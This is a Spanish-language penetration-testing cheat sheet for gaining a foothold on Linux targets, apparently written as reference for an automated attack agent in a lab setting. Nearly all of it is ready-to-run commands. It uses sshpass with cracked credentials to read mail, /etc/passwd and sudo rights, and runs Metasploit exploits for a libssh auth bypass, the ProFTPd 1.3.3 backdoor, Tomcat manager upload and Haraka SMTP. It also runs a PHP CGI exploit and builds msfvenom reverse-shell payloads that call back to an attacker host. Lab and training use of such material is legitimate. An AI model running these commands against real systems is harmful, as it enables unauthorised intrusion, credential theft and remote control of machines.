# FOOTHOLD LINUX — SSH bypass, ProFTPd, PHP CGI

## SSH no-interactivo con credenciales (sshpass)
Tras crackear o descubrir creds (hydra, ssh_login, leak en HTML, etc.),
ejecuta comandos en el target SIN abrir TTY interactivo. El executor NO
es el target; los comandos shell normales se ejecutan en el executor
(Kali), no en la VM atacada. Para tocar la VM, pasa por sshpass+ssh.

IMPORTANTE: sin comillas. ssh une los argumentos que vienen detrás del
host con espacios y se los pasa al shell remoto. Usar comillas confunde
al parser JSON. Para encadenar varios comandos remotos: usa `;` o `&&`
SIN comillas, separa cada operación por espacios.

```bash
# Forma general (sin comillas): UN solo comando remoto
sshpass -pPASS ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 USER@<TARGET_IP> COMANDO_REMOTO ARGS

# Ejemplos con creds camilo:password1 contra <TARGET_IP>
sshpass -ppassword1 ssh -o StrictHostKeyChecking=no camilo@<TARGET_IP> id
sshpass -ppassword1 ssh -o StrictHostKeyChecking=no camilo@<TARGET_IP> ls -la /var/mail/camilo
sshpass -ppassword1 ssh -o StrictHostKeyChecking=no camilo@<TARGET_IP> cat /var/mail/camilo
sshpass -ppassword1 ssh -o StrictHostKeyChecking=no camilo@<TARGET_IP> cat /etc/passwd
sshpass -ppassword1 ssh -o StrictHostKeyChecking=no camilo@<TARGET_IP> sudo -l
sshpass -ppassword1 ssh -o StrictHostKeyChecking=no camilo@<TARGET_IP> uname -a

# Para descargar ficheros usa scp (no SSH 'get'), también sin comillas:
sshpass -ppassword1 scp -o StrictHostKeyChecking=no camilo@<TARGET_IP>:/var/mail/camilo /tmp/mail_camilo
```

## SSH libssh Auth Bypass
```bash
msfconsole -q -x "use auxiliary/scanner/ssh/libssh_auth_bypass; set RHOSTS <TARGET_IP>; set SPAWN_PTY true; run; exit -y"
```

## ProFTPd 1.3.3
```bash
searchsploit ProFTPD
msfconsole -q -x "use exploit/unix/ftp/proftpd_133c_backdoor; set RHOSTS <TARGET_IP>; run; exit -y"
```

## PHP 5.2.4 CGI (Puerto 80)
```bash
nmap -sV -sC -p 80 <TARGET_IP>
searchsploit php cgi
searchsploit -m 18836
python2 18836.py <TARGET_IP> 80
```

## Tomcat — WAR File Upload (Puerto 8180/8080)
```bash
# Credenciales por defecto: tomcat:s3cret, admin:admin, tomcat:tomcat
msfvenom -p java/shell_reverse_tcp LHOST=<LHOST> LPORT=443 -f war -o reverse.war
# Subir en /manager/html → navegar a http://<TARGET_IP>:8080/reverse/

msfconsole -q -x "use exploit/multi/http/tomcat_mgr_upload; set RHOSTS <TARGET_IP>; set RPORT 8180; set HttpUsername tomcat; set HttpPassword tomcat; set LHOST <LHOST>; run; exit -y"
```

## Haraka SMTP
```bash
msfconsole -q -x "use exploit/linux/smtp/haraka; set SRVPORT 9898; set email_to root@attackdefense.test; set payload linux/x64/meterpreter_reverse_http; set LHOST <LHOST>; set LPORT 8080; run; exit -y"
```
